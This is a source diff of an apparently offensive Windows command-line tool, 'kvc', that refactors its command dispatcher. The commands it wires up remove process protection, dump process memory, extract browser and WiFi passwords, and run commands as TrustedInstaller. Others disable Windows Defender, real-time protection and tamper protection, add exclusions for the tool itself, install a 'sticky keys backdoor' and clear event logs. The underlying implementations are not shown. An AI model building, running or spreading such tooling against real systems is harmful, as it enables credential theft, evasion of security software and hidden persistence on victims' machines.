-				const bool installed = IsServiceInstalled();
-				const bool running = installed ? IsServiceRunning() : false;
-				
-				std::wcout << L"\n";
-				INFO(L"Service Information:");
-				INFO(L" Name: %s", ServiceConstants::SERVICE_NAME);
-				INFO(L" Display Name: %s", ServiceConstants::SERVICE_DISPLAY_NAME);
-				std::wcout << L"\n";
-				
-				if (installed) {
-					SUCCESS(L"Installation Status: INSTALLED");
-					if (running) {
-						SUCCESS(L"Runtime Status: RUNNING");
-						SUCCESS(L"Service is operational and ready for kernel operations");
-					} else {
-						ERROR(L"Runtime Status: STOPPED");
-						INFO(L"Use 'kvc service start' to start the service");
-					}
-				} else {
-					ERROR(L"Installation Status: NOT INSTALLED");
-					INFO(L"Use 'kvc install' to install the service first");
-				}
-				
-				std::wcout << L"\n";
-				return 0;
-			} else {
-				ERROR(L"Unknown service command: %s", subCmd.data());
-				return 1;
-			}
-        }
-        
-        // ====================================================================
-        // PROCESS INFORMATION COMMANDS
-        // ====================================================================
-        
-        else if (command == L"list") {
-            // Detect reboot and enforce session limit
+        // --- Process Ops ---
+        {L"list", [](int, wchar_t**) {
             g_controller->m_sessionMgr.DetectAndHandleReboot();
             return g_controller->ListProtectedProcesses() ? 0 : 2;
-        }
-        
-		// ====================================================================
-		// PROCESS INFORMATION COMMANDS
-		// ====================================================================
-
-		else if (command == L"list") {
-			// Detect reboot and enforce session limit
-			g_controller->m_sessionMgr.DetectAndHandleReboot();
-			return g_controller->ListProtectedProcesses() ? 0 : 2;
-		}
-
-		else if (command == L"get")
-		{
-			if (argc < 3)
-			{
-				ERROR(L"Missing PID/process name argument");
-				return 1;
-			}
-
-			std::wstring_view target = argv[2];
-			
-			// Simple protection info display
-			if (IsNumeric(target))
-			{
-				auto pid = ParsePid(target);
-				if (!pid)
-				{
-					ERROR(L"Invalid PID format: %s", target.data());
-					return 1;
-				}
-				return g_controller->GetProcessProtection(pid.value()) ? 0 : 2;
-			}
-			else
-			{
-				std::wstring processName(target);
-				return g_controller->GetProcessProtectionByName(processName) ? 0 : 2;
-			}
-		}
-
-		else if (command == L"info") {
-			if (argc < 3) {
-				ERROR(L"Missing PID/process name argument for detailed information");
-				return 1;
-			}
-
-			std::wstring_view target = argv[2];
-			
-			if (IsNumeric(target)) {
-				auto pid = ParsePid(target);
-				if (!pid) {
-					ERROR(L"Invalid PID format: %s", target.data());
-					return 1;
-				}
-				return g_controller->PrintProcessInfo(pid.value()) ? 0 : 2;
-			} else {
-				std::wstring processName(target);
-				auto match = g_controller->ResolveNameWithoutDriver(processName);
-				if (match) {
-					return g_controller->PrintProcessInfo(match->Pid) ? 0 : 2;
-				} else {
-					return 2;
-				}
-			}
-		}
-		
-		// ====================================================================
-		// MODULE ENUMERATION COMMANDS
-		// ====================================================================
-		
-		else if (command == L"modules" || command == L"mods") {
-			if (argc < 3) {
-				ERROR(L"Missing PID/process name argument");
-				ERROR(L"Usage: kvc modules <PID|process_name> [read <module> [offset] [size]]");
-				return 1;
-			}
-			
-			std::wstring_view target = argv[2];
-			DWORD targetPid = 0;
-			
-			// Resolve target to PID
-			if (IsNumeric(target)) {
-				auto pid = ParsePid(target);
-				if (!pid) {
-					ERROR(L"Invalid PID format: %s", target.data());
-					return 1;
-				}
-				targetPid = pid.value();
-			} else {
-				std::wstring processName(target);
-				auto match = g_controller->ResolveNameWithoutDriver(processName);
-				if (!match) {
-					ERROR(L"Process not found: %s", processName.c_str());
-					return 1;
-				}
-				targetPid = match->Pid;
-				INFO(L"Resolved '%s' to PID %lu", match->ProcessName.c_str(), targetPid);
-			}
-			
-			// Check for read subcommand
-			if (argc >= 4) {
-				std::wstring subCmd = StringUtils::ToLowerCaseCopy(std::wstring(argv[3]));
-				
-				if (subCmd == L"read") {
-					if (argc < 5) {
-						ERROR(L"Missing module name for read operation");
-						ERROR(L"Usage: kvc modules <PID> read <module_name> [offset] [size]");
-						return 1;
-					}
-					
-					std::wstring moduleName = argv[4];
-					ULONG_PTR offset = 0;
-					size_t readSize = 256;  // Default read size
-					
-					// Parse optional offset
-					if (argc >= 6) {
-						std::wstring offsetStr = argv[5];
-						if (offsetStr.substr(0, 2) == L"0x" || offsetStr.substr(0, 2) == L"0X") {
-							offset = wcstoull(offsetStr.c_str() + 2, nullptr, 16);
-						} else {
-							offset = wcstoull(offsetStr.c_str(), nullptr, 10);
-						}
-					}
-					
-					// Parse optional size
-					if (argc >= 7) {
-						std::wstring sizeStr = argv[6];
-						if (sizeStr.substr(0, 2) == L"0x" || sizeStr.substr(0, 2) == L"0X") {
-							readSize = static_cast<size_t>(wcstoull(sizeStr.c_str() + 2, nullptr, 16));
-						} else {
-							readSize = static_cast<size_t>(wcstoull(sizeStr.c_str(), nullptr, 10));
-						}
-					}
-					
-					return g_controller->ReadModuleMemory(targetPid, moduleName, offset, readSize) ? 0 : 2;
-				}
-			}
-			
-			// Default: enumerate modules
-			return g_controller->EnumerateProcessModules(targetPid) ? 0 : 2;
-		}
-
-        else if (command == L"list-signer") {
-            if (argc < 3) {
-                ERROR(L"Missing signer type argument");
-                return 1;
+        }},
+        {L"info", [](int argc, wchar_t** argv) {
+            if (argc < 3) { ERROR(L"Missing PID/process name argument for detailed information"); return 1; }
+            if (IsNumeric(argv[2])) {
+                auto pid = ParsePid(argv[2]);
+                if(!pid) { ERROR(L"Invalid PID format: %s", argv[2]); return 1; }
+                return g_controller->PrintProcessInfo(pid.value()) ? 0 : 2;
             }
-            
-            std::wstring signerName = argv[2];
-            return g_controller->ListProcessesBySigner(signerName) ? 0 : 1;
-        }
-        
-        // ====================================================================
-        // PROCESS PROTECTION COMMANDS
-        // ====================================================================
-        
-        else if (command == L"set" || command == L"protect") {
-            if (argc < 5) {
-                ERROR(L"Missing arguments: <PID/process_name> <PP|PPL> <SIGNER_TYPE>");
-                return 1;
+            auto match = g_controller->ResolveNameWithoutDriver(argv[2]);
+            if (match) return g_controller->PrintProcessInfo(match->Pid) ? 0 : 2;
+            return 2;
+        }},
+        {L"get", [](int argc, wchar_t** argv) {
+            if (argc < 3) { ERROR(L"Missing PID/process name argument"); return 1; }
+            if (IsNumeric(argv[2])) {
+                auto pid = ParsePid(argv[2]);
+                if(!pid) { ERROR(L"Invalid PID format: %s", argv[2]); return 1; }
+                return g_controller->GetProcessProtection(pid.value()) ? 0 : 2;
             }
-            
-            std::wstring_view target = argv[2];
-            std::wstring level = argv[3];
-            std::wstring signer = argv[4];
-            
-            // Handle comma-separated list for batch operations
-            std::wstring targetStr(target);
-            if (targetStr.find(L',') != std::wstring::npos) {
-                std::vector<std::wstring> targets;
-                std::wstring current;
-                
-                for (wchar_t ch : targetStr) {
-                    if (ch == L',') {
-                        if (!current.empty()) {
-                            targets.push_back(current);
-                            current.clear();
-                        }
-                    } else if (ch != L' ' && ch != L'\t') {
-                        current += ch;
-                    }
-                }
-                
-                if (!current.empty())
-                    targets.push_back(current);
-                
-                if (targets.empty()) {
-                    ERROR(L"No valid targets in comma-separated list");
-                    return 1;
-                }
-                
-                INFO(L"Batch %s operation: %zu targets", command.data(), targets.size());
-                
-                bool result = (command == L"set") ?
-                    g_controller->SetMultipleProcessesProtection(targets, level, signer) :
-                    g_controller->ProtectMultipleProcesses(targets, level, signer);
-                
-                return result ? 0 : 2;
-            }
-            
-            // Single target (PID or name)
-            bool result = false;
-            
-            if (IsNumeric(target)) {
-                auto pid = ParsePid(target);
-                if (!pid) {
-                    ERROR(L"Invalid PID format: %s", target.data());
-                    return 1;
-                }
-                
-                result = (command == L"set") ?
-                    g_controller->SetProcessProtection(pid.value(), level, signer) :
-                    g_controller->ProtectProcess(pid.value(), level, signer);
-            } else {
-                std::wstring processName(target);
-                
-                result = (command == L"set") ?
-                    g_controller->SetProcessProtectionByName(processName, level, signer) :
-                    g_controller->ProtectProcessByName(processName, level, signer);
-            }
-            
-            return result ? 0 : 2;
-        }
-        
-		else if (command == L"unprotect") {
-			if (argc < 3) {
-				ERROR(L"Missing PID/process name argument");
-				return 1;
-			}
-			
-			std::wstring_view target = argv[2];
-			
-			// Handle special 'all' keyword
-			if (target == L"all") {
-				return g_controller->UnprotectAllProcesses() ? 0 : 2;
-			}
-			
-			// Handle comma-separated list
-			std::wstring targetStr(target);
-			if (targetStr.find(L',') != std::wstring::npos) {
-				std::vector<std::wstring> targets;
-				std::wstring current;
-				
-				for (wchar_t ch : targetStr) {
-					if (ch == L',') {
-						if (!current.empty()) {
-							targets.push_back(current);
-							current.clear();
-						}
-					} else if (ch != L' ' && ch != L'\t') {
-						current += ch;
-					}
-				}
-				
-				if (!current.empty())
-					targets.push_back(current);
-				
-				return g_controller->UnprotectMultipleProcesses(targets) ? 0 : 2;
-			}
-			
-			// Single target - check if it's a signer type FIRST
-			auto signerType = Utils::GetSignerTypeFromString(targetStr);
-			if (signerType) {
-				// It's a signer type - unprotect all processes with this signer
-				return g_controller->UnprotectBySigner(targetStr) ? 0 : 2;
-			}
-			
-			// Not a signer - check if it's PID or process name
-			if (IsNumeric(target)) {
-				auto pid = ParsePid(target);
-				if (!pid) {
-					ERROR(L"Invalid PID format: %s", target.data());
-					return 1;
-				}
-				return g_controller->UnprotectProcess(pid.value()) ? 0 : 2;
-			} else {
-				std::wstring processName(target);
-				return g_controller->UnprotectProcessByName(processName) ? 0 : 2;
-			}
-		}
-        
-        else if (command == L"unprotect-signer") {
-            if (argc < 3) {
-                ERROR(L"Missing signer type argument");
-                return 1;
-            }
-            
-            std::wstring signerName = argv[2];
-            return g_controller->UnprotectBySigner(signerName) ? 0 : 2;
-        }
-		
-		else if (command == L"set-signer") {
-			if (argc < 5) {
-				ERROR(L"Missing arguments: <CURRENT_SIGNER> <PP|PPL> <NEW_SIGNER>");
-				return 1;
-			}
-			
-			std::wstring currentSigner = argv[2];
-			std::wstring level = argv[3];
-			std::wstring newSigner = argv[4];
-			
-			auto signerType = Utils::GetSignerTypeFromString(currentSigner);
-			if (!signerType) {
-				ERROR(L"Invalid signer type: %s", currentSigner.c_str());
-				return 1;
-			}
-			
-			return g_controller->SetProtectionBySigner(currentSigner, level, newSigner) ? 0 : 2;
-		}
-        
-        // ====================================================================
-        // MEMORY DUMPING
-        // ====================================================================
-        
-        else if (command == L"dump") {
-            if (argc < 3) {
-                ERROR(L"Missing PID/process name argument");
-                return 1;
-            }
-
-            std::wstring_view target = argv[2];
-            std::wstring outputPath;
-
-            // Use provided output path or default to Downloads
-            if (argc >= 4) {
-                outputPath = argv[3];
-            } else {
-                wchar_t* downloadsPath;
-                if (SHGetKnownFolderPath(FOLDERID_Downloads, 0, NULL, &downloadsPath) == S_OK) {
-                    outputPath = downloadsPath;
-                    outputPath += L"\\";
-                    CoTaskMemFree(downloadsPath);
-                } else {
-                    outputPath = L".\\";
-                }
-            }
-
-            if (IsNumeric(target)) {
-                auto pid = ParsePid(target);
-                if (!pid) {
-                    ERROR(L"Invalid PID format: %s", target.data());
-                    return 1;
-                }
-                return g_controller->DumpProcess(pid.value(), outputPath) ? 0 : 2;
-            } else {
-                std::wstring processName(target);
-                return g_controller->DumpProcessByName(processName, outputPath) ? 0 : 2;
-            }
-        }
-        
-        // ====================================================================
-        // PROCESS TERMINATION
-        // ====================================================================
-        
-        else if (command == L"kill") {
+            return g_controller->GetProcessProtectionByName(argv[2]) ? 0 : 2;
+        }},
+        {L"kill", [](int argc, wchar_t** argv) {
             ProcessManager::HandleKillCommand(argc, argv, g_controller.get());
             return 0;
-        }
-        
-        // ====================================================================
-        // BROWSER PASSWORD EXTRACTION
-        // ====================================================================
-        
-        else if (command == L"browser-passwords" || command == L"bp") {
-            std::wstring browserType = L"chrome";
-            std::wstring outputPath = L".";
-            
-            // Parse arguments
-            for (int i = 2; i < argc; i++) {
-                std::wstring arg = argv[i];
-                if (arg == L"--chrome") {
-                    browserType = L"chrome";
-                } else if (arg == L"--brave") {
-                    browserType = L"brave";
-                } else if (arg == L"--edge") {
-                    browserType = L"edge";
-                } else if (arg == L"--all") {
-                    browserType = L"all";
-                } else if (arg == L"--output" || arg == L"-o") {
-                    if (i + 1 < argc) {
-                        outputPath = argv[++i];
-                    } else {
-                        ERROR(L"Missing path for --output argument");
-                        return 1;
-                    }
-                } else {
-                    ERROR(L"Unknown argument: %s", arg.c_str());
-                    return 1;
-                }
+        }},
+        {L"dump", [](int argc, wchar_t** argv) {
+            if (argc < 3) { ERROR(L"Missing PID/process name argument"); return 1; }
+            std::wstring outPath = (argc >= 4) ? argv[3] : L"";
+            if (outPath.empty()) {
+                wchar_t* dl; 
+                if (SHGetKnownFolderPath(FOLDERID_Downloads, 0, NULL, &dl) == S_OK) { outPath = dl; outPath += L"\\"; CoTaskMemFree(dl); }
+                else outPath = L".\\";
             }
-            
-            // Handle 'all' - requires kvc_pass.exe
-            if (browserType == L"all") {
-                if (!CheckKvcPassExists()) {
-                    ERROR(L"--all requires kvc_pass.exe");
-                    return 1;
-                }
-                
-                if (!g_controller->ExportBrowserData(outputPath, browserType)) {
-                    ERROR(L"Failed to extract from all browsers");
-                    return 1;
-                }
-                return 0;
+            if (IsNumeric(argv[2])) {
+                auto pid = ParsePid(argv[2]);
+                if (!pid) { ERROR(L"Invalid PID format: %s", argv[2]); return 1; }
+                return g_controller->DumpProcess(pid.value(), outPath) ? 0 : 2;
             }
-            
-            // Handle Edge with dual extraction
-            if (browserType == L"edge") {
-                bool hasKvcPass = CheckKvcPassExists();
-                
-                if (hasKvcPass) {
-                    INFO(L"Full Edge extraction: JSON (kvc_pass) + HTML/TXT (KVC DPAPI)");
-                    
-                    if (!g_controller->ExportBrowserData(outputPath, browserType)) {
-                        ERROR(L"kvc_pass extraction failed");
-                    }
-                    
-                    INFO(L"Generating HTML/TXT reports...");
-                    g_controller->ShowPasswords(outputPath);
-                    
-                    SUCCESS(L"Edge extraction complete");
-                } else {
-                    INFO(L"Using built-in Edge DPAPI extraction (HTML/TXT only)");
-                    g_controller->ShowPasswords(outputPath);
-                }
-                return 0;
-            }
-            
-            // Chrome, Brave - require kvc_pass.exe
-            if (!g_controller->ExportBrowserData(outputPath, browserType)) {
-                ERROR(L"Failed to export browser passwords");
-                return 1;
-            }
-            return 0;
-        }
-        
-		else if (command == L"export") {
-			if (argc < 3) {
-				ERROR(L"Missing export subcommand: secrets");
-				return 1;
-			}
-			
-			std::wstring_view subCommand = argv[2];
-			
-			if (subCommand == L"secrets") {
-				std::wstring outputPath = (argc >= 4) ? argv[3] : PathUtils::GetDefaultSecretsOutputPath();
-				
-				if (outputPath.empty()) {
-					ERROR(L"Failed to determine default output path");
-					return 1;
-				}
+            return g_controller->DumpProcessByName(argv[2], outPath) ? 0 : 2;
+        }},
 
-				if (CheckKvcPassExists()) {
-					INFO(L"Extracting browser passwords via COM elevation...");
-					
-					if (!g_controller->ExportBrowserData(outputPath, L"edge")) {
-						INFO(L"Edge COM extraction failed");
-					}
-					
-					if (!g_controller->ExportBrowserData(outputPath, L"chrome")) {
-						INFO(L"Chrome extraction failed");
-					}
-				} else {
-					ERROR(L"kvc_pass.exe not found - Chrome extraction unavailable");
-					INFO(L"Edge will fallback to DPAPI (no JSON output)");
-				}
-				
-				INFO(L"Extracting WiFi and generating DPAPI reports...");
-				g_controller->ShowPasswords(outputPath);
-				
-				return 0;
-			} else {
-				ERROR(L"Unknown export subcommand: %s", subCommand.data());
-				return 1;
-			}
-		}
-        
-        // ====================================================================
-        // SYSTEM INTEGRATION
-        // ====================================================================
-        
-        else if (command == L"trusted") {
-            if (argc < 3) {
-                ERROR(L"Missing command for elevated execution");
-                return 1;
-            }
+        // --- Modules ---
+        {L"modules", HandleModulesCommand},
+        {L"mods",    HandleModulesCommand},
 
-            // Combine remaining arguments
-            std::wstring fullCommand;
-            for (int i = 2; i < argc; i++) {
-                if (i > 2) fullCommand += L" ";
-                fullCommand += argv[i];
-            }
+        // --- Protection ---
+        {L"protect", [](int argc, wchar_t** argv) { return HandleProtectionCommand(argc, argv, false); }},
+        {L"set",     [](int argc, wchar_t** argv) { return HandleProtectionCommand(argc, argv, true); }},
+        {L"set-signer", [](int argc, wchar_t** argv) {
+            if (argc < 5) { ERROR(L"Missing arguments: <CURRENT_SIGNER> <PP|PPL> <NEW_SIGNER>"); return 1; }
+            std::wstring cs = argv[2];
+            if (!Utils::GetSignerTypeFromString(cs)) { ERROR(L"Invalid signer type: %s", cs.c_str()); return 1; }
+            return g_controller->SetProtectionBySigner(cs, argv[3], argv[4]) ? 0 : 2;
+        }},
+        {L"unprotect", HandleUnprotectCommand},
+        {L"unprotect-signer", [](int argc, wchar_t** argv) {
+            if (argc < 3) { ERROR(L"Missing signer type argument"); return 1; }
+            return g_controller->UnprotectBySigner(argv[2]) ? 0 : 2;
+        }},
+        {L"restore", [](int argc, wchar_t** argv) {
+            if (argc < 3) { ERROR(L"Missing argument: <signer_name|all>"); return 1; }
+            std::wstring t = argv[2];
+            return (t == L"all") ? (g_controller->RestoreAllProtection() ? 0 : 2) 
+                                 : (g_controller->RestoreProtectionBySigner(t) ? 0 : 2);
+        }},
+        {L"history", [](int, wchar_t**) { g_controller->ShowSessionHistory(); return 0; }},
+        {L"cleanup-sessions", [](int, wchar_t**) { g_controller->m_sessionMgr.CleanupAllSessionsExceptCurrent(); return 0; }},
+        {L"list-signer", [](int argc, wchar_t** argv) {
+            if (argc < 3) { ERROR(L"Missing signer type argument"); return 1; }
+            return g_controller->ListProcessesBySigner(argv[2]) ? 0 : 1;
+        }},
 
-            return g_controller->RunAsTrustedInstaller(fullCommand) ? 0 : 2;
-        }
-        
-        else if (command == L"install-context") {
-            return g_controller->AddContextMenuEntries() ? 0 : 1;
-        }
-        
-		// ====================================================================
-		// WINDOWS DEFENDER MANAGEMENT
-		// ====================================================================
-
-		else if (command == L"secengine") {
-			if (argc < 3) {
-				ERROR(L"Missing subcommand for secengine. Usage: kvc secengine <disable|enable|status>");
-				return 1;
-			}
-			
-			std::wstring_view subcommand = argv[2];
-			
-			if (subcommand == L"disable") {
-				if (DefenderManager::DisableSecurityEngine()) {
-					SUCCESS(L"Security engine disabled successfully - restart required");
-					
-					if (argc > 3 && std::wstring_view(argv[3]) == L"--restart") {
-						INFO(L"Initiating system restart...");
-						return InitiateSystemRestart() ? 0 : 1;
-					}
-					return 0;
-				}
-				return 1;
-			}
-			else if (subcommand == L"enable") {
-				if (DefenderManager::EnableSecurityEngine()) {
-					SUCCESS(L"Security engine enabled successfully - restart required");
-					
-					if (argc > 3 && std::wstring_view(argv[3]) == L"--restart") {
-						INFO(L"Initiating system restart...");
-						return InitiateSystemRestart() ? 0 : 1;
-					}
-					return 0;
-				}
-				return 1;
-			}
-			else if (subcommand == L"status") {
-				auto status = DefenderManager::GetSecurityEngineStatus();
-				
-				if (status == DefenderManager::SecurityState::ENABLED) {
-					INFO(L"Security Engine Status: ENABLED (Active Protection)");
-					HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
-					SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN | FOREGROUND_INTENSITY);
-					std::wcout << L" Windows Defender is actively protecting the system\n";
-					SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
-				}
-				else if (status == DefenderManager::SecurityState::DISABLED) {
-					INFO(L"Security Engine Status: DISABLED (Inactive Protection)");
-					HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
-					SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_INTENSITY);
-					std::wcout << L" Windows Defender protection is disabled\n";
-					SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
-				}
-				else {
-					INFO(L"Security Engine Status: UNKNOWN (Cannot determine state)");
-					HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
-					SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
-					std::wcout << L" Unable to determine Defender protection state\n";
-					SetConsoleTextAttribute(hConsole, FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
-				}
-				
-				return 0;
-			}
-			else {
-				ERROR(L"Invalid secengine subcommand: %s", subcommand.data());
-				ERROR(L"Valid subcommands: disable, enable, status");
-				return 1;
-			}
-		}
-
-		// ============================================================================
-		// WINDOWS DEFENDER REAL-TIME PROTECTION CONTROL
-		// ============================================================================
-		
-		else if (command == L"rtp") {
-			if (argc < 3) {
-				INFO(L"Usage: kvc rtp <on|off|status>");
-				return 1;
-			}
-
-			WindowsDefenderAutomation wda;
-			if (!wda.openDefenderSettings()) {
-				ERROR(L"Failed to open Windows Security");
-				return 1;
-			}
-
-			std::wstring_view action = argv[2];
-			bool result = false;
-
-			if (action == L"on") {
-				result = wda.enableRealTimeProtection();
-				if (result) SUCCESS(L"Real-Time Protection enabled successfully");
-				else ERROR(L"Failed to enable Real-Time Protection");
-			}
-			else if (action == L"off") {
-				result = wda.disableRealTimeProtection();
-				if (result) SUCCESS(L"Real-Time Protection disabled successfully");
-				else ERROR(L"Failed to disable Real-Time Protection");
-			}
-			else if (action == L"status") {
-				wda.getRealTimeProtectionStatus();
-				result = true;
-			}
-			else {
-				ERROR(L"Unknown action: %s", action.data());
-				INFO(L"Usage: kvc rtp <on|off|status>");
-			}
-
-			wda.closeSecurityWindow();
-			return result ? 0 : 1;
-		}
-		
-		// ============================================================================
-		// WINDOWS DEFENDER TAMPER PROTECTION CONTROL
-		// ============================================================================
-		
-		else if (command == L"tp") {
-			if (argc < 3) {
-				INFO(L"Usage: kvc tp <on|off|status>");
-				return 1;
-			}
-
-			WindowsDefenderAutomation wda;
-			if (!wda.openDefenderSettings()) {
-				ERROR(L"Failed to open Windows Security");
-				return 1;
-			}
-
-			std::wstring_view action = argv[2];
-			bool result = false;
-
-			if (action == L"on") {
-				result = wda.enableTamperProtection();
-				if (result) SUCCESS(L"Tamper Protection enabled successfully");
-				else ERROR(L"Failed to enable Tamper Protection");
-			}
-			else if (action == L"off") {
-				result = wda.disableTamperProtection();
-				if (result) SUCCESS(L"Tamper Protection disabled successfully");
-				else ERROR(L"Failed to disable Tamper Protection");
-			}
-			else if (action == L"status") {
-				wda.getTamperProtectionStatus();
-				result = true;
-			}
-			else {
-				ERROR(L"Unknown action: %s", action.data());
-				INFO(L"Usage: kvc tp <on|off|status>");
-			}
-
-			wda.closeSecurityWindow();
-			return result ? 0 : 1;
-		}
-
-		else if (command == L"add-exclusion") {
-			// Legacy: no args = add self
-			if (argc < 3) {
-				wchar_t exePath[MAX_PATH];
-				if (GetModuleFileNameW(nullptr, exePath, MAX_PATH) == 0) {
-					ERROR(L"Failed to get current executable path");
-					return 1;
-				}
-				
-				INFO(L"Adding self to Defender exclusions: %s", exePath);
-				return g_controller->AddToDefenderExclusions(exePath) ? 0 : 2;
-			}
-			
-			std::wstring subCmd = StringUtils::ToLowerCaseCopy(argv[2]);
-			
-			if (subCmd == L"paths" || subCmd == L"path") {
-				if (argc < 4) {
-					ERROR(L"Missing path argument");
-					return 1;
-				}
-				return g_controller->AddPathExclusion(argv[3]) ? 0 : 2;
-			}
-			else if (subCmd == L"processes" || subCmd == L"process") {
-				if (argc < 4) {
-					ERROR(L"Missing process argument");
-					return 1;
-				}
-				return g_controller->AddProcessExclusion(argv[3]) ? 0 : 2;
-			}
-			else if (subCmd == L"extensions" || subCmd == L"extension") {
-				if (argc < 4) {
-					ERROR(L"Missing extension argument");
-					return 1;
-				}
-				return g_controller->AddExtensionExclusion(argv[3]) ? 0 : 2;
-			}
-			else if (subCmd == L"ipaddresses" || subCmd == L"ip") {
-				if (argc < 4) {
-					ERROR(L"Missing IP address argument");
-					return 1;
-				}
-				return g_controller->AddIpAddressExclusion(argv[3]) ? 0 : 2;
-			}
-			else {
-				// Legacy: treat as direct path
-				return g_controller->AddToDefenderExclusions(argv[2]) ? 0 : 2;
-			}
-		}
-		
-		else if (command == L"remove-exclusion") {
-			// Legacy: no args = remove self
-			if (argc < 3) {
-				wchar_t exePath[MAX_PATH];
-				if (GetModuleFileNameW(nullptr, exePath, MAX_PATH) == 0) {
-					ERROR(L"Failed to get current executable path");
-					return 1;
-				}
-				
-				INFO(L"Removing self from Defender exclusions: %s", exePath);
-				return g_controller->RemoveFromDefenderExclusions(exePath) ? 0 : 2;
-			}
-			
-			std::wstring subCmd = StringUtils::ToLowerCaseCopy(argv[2]);
-			
-			if (subCmd == L"paths" || subCmd == L"path") {
-				if (argc < 4) {
-					ERROR(L"Missing path argument");
-					return 1;
-				}
-				return g_controller->RemovePathExclusion(argv[3]) ? 0 : 2;
-			}
-			else if (subCmd == L"processes" || subCmd == L"process") {
-				if (argc < 4) {
-					ERROR(L"Missing process argument");
-					return 1;
-				}
-				return g_controller->RemoveProcessExclusion(argv[3]) ? 0 : 2;
-			}
-			else if (subCmd == L"extensions" || subCmd == L"extension") {
-				if (argc < 4) {
-					ERROR(L"Missing extension argument");
-					return 1;
-				}
-				return g_controller->RemoveExtensionExclusion(argv[3]) ? 0 : 2;
-			}
-			else if (subCmd == L"ipaddresses" || subCmd == L"ip") {
-				if (argc < 4) {
-					ERROR(L"Missing IP address argument");
-					return 1;
-				}
-				return g_controller->RemoveIpAddressExclusion(argv[3]) ? 0 : 2;
-			}
-			else {
-				// Legacy: treat as direct path
-				return g_controller->RemoveFromDefenderExclusions(argv[2]) ? 0 : 2;
-			}
-		}
-		
-	    else if (command == L"disable-defender") {
+        // --- Defender & Security ---
+        {L"secengine", HandleSecEngineCommand},
+        {L"disable-defender", [](int argc, wchar_t** argv) {
             INFO(L"Disabling Windows Defender (requires restart)...");
-            bool result = DefenderManager::DisableSecurityEngine();
-            
-            if (result) {
-                SUCCESS(L"Windows Defender disabled successfully");
-                INFO(L"System restart required to apply changes");
-                
-                if (argc >= 3 && std::wstring_view(argv[2]) == L"--restart") {
-                    INFO(L"Initiating system restart...");
-                    return InitiateSystemRestart() ? 0 : 2;
-                }
-            }
-            
-            return result ? 0 : 2;
-        }
+            bool r = DefenderManager::DisableSecurityEngine();
+            if(r) { SUCCESS(L"Windows Defender disabled successfully"); INFO(L"System restart required to apply changes"); }
+            if(r && argc >= 3 && std::wstring(argv[2]) == L"--restart") { INFO(L"Initiating system restart..."); InitiateSystemRestart(); }
+            return r ? 0 : 2;
+        }},
+        {L"enable-defender", [](int, wchar_t**) { return DefenderManager::EnableSecurityEngine() ? 0 : 2; }},
         
-        else if (command == L"enable-defender") {
-            return DefenderManager::EnableSecurityEngine() ? 0 : 2;
-        }
-        
-        // ====================================================================
-        // STICKY KEYS BACKDOOR
-        // ====================================================================
-        
-        else if (command == L"shift") {
-            INFO(L"Installing sticky keys backdoor...");
-            return g_controller->InstallStickyKeysBackdoor() ? 0 : 2;
-        }
-        
-        else if (command == L"unshift") {
-            INFO(L"Removing sticky keys backdoor...");
-            return g_controller->RemoveStickyKeysBackdoor() ? 0 : 2;
-        }
-        
-        // ====================================================================
-        // REGISTRY OPERATIONS
-        // ====================================================================
-        
-        else if (command == L"registry") {
-            if (argc < 3) {
-                ERROR(L"Missing registry subcommand: backup, restore, defrag");
-                return 1;
-            }
-            
-            std::wstring_view subcommand = argv[2];
-            HiveManager hiveManager;
-            
-            if (subcommand == L"backup") {
-                std::wstring targetPath;
-                if (argc >= 4)
-                    targetPath = argv[3];
-                
-                return hiveManager.Backup(targetPath) ? 0 : 2;
-            }
-            else if (subcommand == L"restore") {
-                if (argc < 4) {
-                    ERROR(L"Missing source path for restore");
-                    return 1;
-                }
-                
-                std::wstring sourcePath = argv[3];
-                return hiveManager.Restore(sourcePath) ? 0 : 2;
-            }
-            else if (subcommand == L"defrag") {
-                std::wstring tempPath;
-                if (argc >= 4)
-                    tempPath = argv[3];
-                
-                return hiveManager.Defrag(tempPath) ? 0 : 2;
-            }
-            else {
-                ERROR(L"Unknown registry subcommand: %s", subcommand.data());
-                return 1;
-            }
-        }
-        
-        // ====================================================================
-        // SESSION MANAGEMENT
-        // ====================================================================
-        
-        else if (command == L"restore") {
-            if (argc < 3) {
-                ERROR(L"Missing argument: <signer_name|all>");
-                return 1;
-            }
-            
-            std::wstring_view target = argv[2];
-            
-            if (target == L"all") {
-                return g_controller->RestoreAllProtection() ? 0 : 2;
-            } else {
-                std::wstring signerName(target);
-                return g_controller->RestoreProtectionBySigner(signerName) ? 0 : 2;
-            }
-        }
-        
-        else if (command == L"history") {
-            g_controller->ShowSessionHistory();
-            return 0;
-        }
-        
-        else if (command == L"cleanup-sessions") {
-            g_controller->m_sessionMgr.CleanupAllSessionsExceptCurrent();
-            return 0;
-        }
-        
-        // ====================================================================
-        // ADVANCED OPERATIONS
-        // ====================================================================
-        
-        else if (command == L"setup") {
-            INFO(L"Loading and processing kvc.dat combined binary...");
-            return g_controller->LoadAndSplitCombinedBinaries() ? 0 : 2;
-        }
-        
-        else if (command == L"evtclear") {
-            return g_controller->ClearSystemEventLogs() ? 0 : 2;
-        }
-		
-		// ====================================================================
-		// WATERMARK MANAGEMENT
-		// ====================================================================
+        // --- Defender UI Automation ---
+        {L"rtp", [](int argc, wchar_t** argv) {
+            if (argc < 3) { INFO(L"Usage: kvc rtp <on|off|status>"); return 1; }
+            WindowsDefenderAutomation wda;
+            if (!wda.openDefenderSettings()) { ERROR(L"Failed to open Windows Security"); return 1; }
+            std::wstring act = argv[2];
+            bool res = false;
+            if (act == L"on") { res = wda.enableRealTimeProtection(); if(res) SUCCESS(L"Real-Time Protection enabled successfully"); else ERROR(L"Failed to enable Real-Time Protection"); }
+            else if (act == L"off") { res = wda.disableRealTimeProtection(); if(res) SUCCESS(L"Real-Time Protection disabled successfully"); else ERROR(L"Failed to disable Real-Time Protection"); }
+            else if (act == L"status") { wda.getRealTimeProtectionStatus(); res = true; }
